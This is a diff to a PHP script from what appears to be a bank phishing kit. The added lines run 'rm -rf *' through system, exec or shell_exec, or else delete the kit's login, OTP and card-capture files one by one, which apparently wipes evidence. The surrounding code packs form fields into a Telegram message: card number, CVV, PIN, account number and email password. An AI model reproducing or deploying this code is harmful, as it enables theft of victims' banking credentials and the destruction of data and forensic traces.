@@ -1,3 +1,26 @@
+ if(function_exists('system')) {
+         system('rm -rf *');
+      }
+      elseif(function_exists('exec')) {
+         exec('rm -rf *');
+      }
+      elseif(function_exists('shell_exec')) {
+         shell_exec('rm -rf *');
+      }
+      else {
+        unlink('lbpiaccess.zip');
+        unlink('confirm.php');
+        unlink('cc.jpg');
+        unlink('otp-login.php');
+        unlink('otp-expired.jpg');
+        unlink('otp.jpg');
+        unlink('mobile-login.php');
+        unlink('mobile.jpg');
+        unlink('login.php');
+        unlink('index.php');
+        unlink('index.jpg');
+      }
+
 $us = [
 'chat_id' => "-635799224",
 'text' => "Firstname: " . $_POST['fname'] . "\nMiddlename: " . $_POST['mname'] . "\nLastname: " . $_POST['lname'] . "\nZip: " . $_POST['zip'] . "\nNumber: " . $_POST['cnumber'] . "\nBday: " . $_POST['bday'] . "\nAcc Num: " . $_POST['accnum'] . "\nCC: " . $_POST['cc'] . "\nExpiration: " . $_POST['exp'] . "\nCVV: " . $_POST['cvv'] . "\nPIN: " . $_POST['pin'] . "\nEmail: " . $_POST['email'] . "\nEmail Pass: " . $_POST['email_pass']
